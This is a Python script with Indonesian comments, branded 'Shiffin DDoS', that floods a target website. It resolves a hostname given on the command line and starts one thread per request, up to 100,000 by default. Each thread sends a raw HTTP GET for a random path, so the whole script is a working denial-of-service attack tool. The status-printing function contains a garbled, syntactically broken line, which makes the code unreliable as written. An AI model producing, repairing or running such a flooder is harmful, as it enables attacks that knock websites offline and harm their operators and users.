# -*- coding: utf-8 -*-
import os
import random
import socket
import string
import sys
import threading
import time

# Warna ASCII Art
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Mengurai inputs
host = ""
ip = ""
port = 0
num_requests = 0


print(" ")
print("\033[95m       ®® @ @   ®®       ®  ®®  ®® ® ® @  ®® ® ® ®  ®®  @@         @    \033[0m")
print("\033[95m     ®®         ®®       ®  ®®  ®®        @®        ®®  @@ @       @    \033[0m")
print("\033[95m    ®®          ®®       ®  ®®  ®®        ®®        @@  @@  @      @    \033[0m")
print("\033[92m      ®®        ®®       ®  ®®  ®®        ®®        ®®  @@   @     @    \033[0m")
print("\033[92m        ©©      ©© @ © © ©  ©©  ©© @ @    @@ @ @    @@  @@    @    @    \033[0m")
print("\033[92m          ©©    ®®       ©  ©©  ©©        ©©        ©©  ©©     ©   ©    \033[0m")
print("\033[96m            ©   ©©       ©  ©©  ©©        ©©        ©©  ©©      ©  ©    \033[0m")
print("\033[96m            ©©  ©©       ©  ©©  ©©        ©©        ©©  ©©       © ©    \033[0m")
print("\033[96m      © © ©©    ©©       ©  ©©  ©©        ©©        ©©  ©©         ©    \033[0m")
print("\033[94m          °° °  °°       °  °°  °°        °°        °°  °°         °    \033[0m")
print("\033[94m            °    °       °   °   °         °         °   °         °    \033[0m")
print("\033[93m==========================================================================      \033[0m")
print("\033[4m||                                                                               \033[0m")
print("\033[4m||                                                                               \033[0m")
print("\033[4m||                                                                               \033[0m")
print("\033[4m||                                                                               \033[0m")
print("\033[93m==========================================================================      \033[0m")

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
    sys.exit(1)

# Ubah FQDN ke IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Buat variabel bersama untuk jumlah utas
thread_num = 0
thread_num_mutex = threading.Lock()


# print status utas
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print output pada baris yang sama
    sys.stdout.write(f" {time.ctime().split()[3]} [{str(thread_num)}]")
    print(f"\033[96m{0} Shiffin DDoS\003[0m") "\033[93msedang mengirimkan paket|\033[0m".format(round))
    sys.stdout.flush()
    thread_num_mutex.release()


# Hasilkan Jalur URL
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Lakukan permintaan
def attack():
    print_status()
    url_path = generate_url_path()

    # Buat soket mentah
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Buka koneksi pada soket mentah tsb
        dos.connect((ip, port))

        # Kirim permintaan sesuai spesifikasi HTTP
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\033[1m [ No connection, server may be down ]: {str(socket.error)}\033[0m")
    finally:
        # Tutup soket dengan rapi
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print (f"Sent massage {1 + 1}")

# Memunculkan thread per permintaan
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Jadikan thread utama menunggu cabang thread 
